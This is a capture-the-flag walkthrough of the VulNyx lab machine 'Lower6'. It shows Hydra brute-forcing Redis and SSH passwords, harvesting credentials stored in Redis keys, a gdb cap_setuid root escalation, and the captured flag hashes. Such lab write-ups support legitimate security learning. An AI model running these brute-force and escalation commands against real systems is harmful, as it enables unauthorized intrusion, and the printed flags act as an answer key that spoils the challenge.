# VulNyx - Lower6

## Information

## Solution

### Enumeration
#### Nmap
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sVC -p- -T4 10.11.5.15
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-18 22:08 +07
Nmap scan report for 10.11.5.15
Host is up (0.00070s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
6379/tcp open  redis   Redis key-value store
MAC Address: 08:00:27:DC:D0:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.90 seconds
```
`Redis` (Remote Dictionary Server) is an open-source key-value store that operates entirely in memory (RAM).

`Nmap` doesn't show a specific version, suggesting that the service may be allowing anonymous connections (unauthenticated) or not requiring a strong password.

### Shell
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ redis-cli -h 10.11.5.15 -p 6379
10.11.5.15:6379> ping
(error) NOAUTH Authentication required.
```
`(error) NOAUTH Authentication required`, we will need to try a brute-force password.

#### Hydra
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ hydra -t 64 redis://10.11.5.15 -P /usr/share/wordlists/rockyou.txt   
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-18 22:44:48
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking redis://10.11.5.15:6379/
[6379][redis] host: 10.11.5.15   password: hellow
[STATUS] attack finished for 10.11.5.15 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-18 22:45:09
```
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ redis-cli -h 10.11.5.15 -p 6379 -a hellow
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
10.11.5.15:6379> ping
PONG
```
List all existing keys on a remote Redis server, while hiding unnecessary security warning messages.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ redis-cli -h 10.11.5.15 -a hellow KEYS '*' 2>/dev/null
1) "key3"
2) "key2"
3) "key1"
4) "key4"
5) "key5"

┌──(dungcngo㉿kali)-[/tmp]
└─$ redis-cli -h 10.11.5.15 -a hellow MGET key1 key2 key3 key4 key5 2>/dev/null
1) "killer:K!ll3R123"
2) "ghost:Ghost!Hunter42"
3) "snake:Pixel_Sn4ke77"
4) "wolf:CyberWolf#21"
5) "shadow:ShadowMaze@9"
```
This command instructs Redis to return the values ​​of all the keys listed behind it (`key1, key2, key3, key4, key5`) in a single query.

Now we create a wordlist of usernames and another of passwords
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ redis-cli -h 10.11.5.15 -a hellow MGET key1 key2 key3 key4 key5 2>/dev/null |awk '{print $1}' |cut -d ':' -f1 >users.dic
                                                                                     
┌──(dungcngo㉿kali)-[/tmp]
└─$ redis-cli -h 10.11.5.15 -a hellow MGET key1 key2 key3 key4 key5 2>/dev/null |awk '{print $1}' |awk '{print $1}' |cut -d ':' -f2 >pass.dic
```
**Hydra**
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ hydra -t 64 -L users.dic -P pass.dic ssh://10.11.5.15   
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-18 23:19:58
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 25 tasks per 1 server, overall 25 tasks, 25 login tries (l:5/p:5), ~1 try per task
[DATA] attacking ssh://10.11.5.15:22/
[22][ssh] host: 10.11.5.15   login: killer   password: ShadowMaze@9
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-18 23:20:06
```
**SSH**
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ ssh killer@10.11.5.15 
The authenticity of host '10.11.5.15 (10.11.5.15)' can't be established.
ED25519 key fingerprint is: SHA256:4K6G5c0oerBJXgd6BnT2Q3J+i/dOR4+6rQZf20TIk/U
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:16: [hashed name]
    ~/.ssh/known_hosts:21: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.11.5.15' (ED25519) to the list of known hosts.
killer@10.11.5.15's password: 
killer@lower6:~$ id ; hostname
uid=1000(killer) gid=1000(killer) grupos=1000(killer)
lower6
```

### Privilege Escalation
#### Enumeration
**Capabilities**
```bash
killer@lower6:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
/usr/bin/gdb cap_setuid=ep
```
#### Abuse
![gtfo-bins](/walkthroughs/vulnyx/low-difficulty/33_lower6/gtfo-bins.png)

```bash
killer@lower6:~$ /usr/bin/gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
GNU gdb (Debian 13.1-3) 13.1
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
# bash -pi
root@lower6:~# id ; hostname
uid=0(root) gid=1000(killer) grupos=1000(killer)
lower6
```
- `-ex 'python import os; os.setuid(0)'`: The `-ex` (execute) option is used to run a GDB command at startup. `import os; os.setuid(0)` - this command forces the GDB process to switch entirely to `root` privileges.
- `-ex '!sh'`: Execute the second command after you have `root` privileges (open a new command line window - shell).

#### Flags
```bash
root@lower6:~# find / -name root.txt -o -name user.txt 2>/dev/null |xargs cat
03f4adf5855fe3a1e0df4b0c885ec67a
8ec061fc51f064186d2b0661c004be93
```

***You are welcome!***
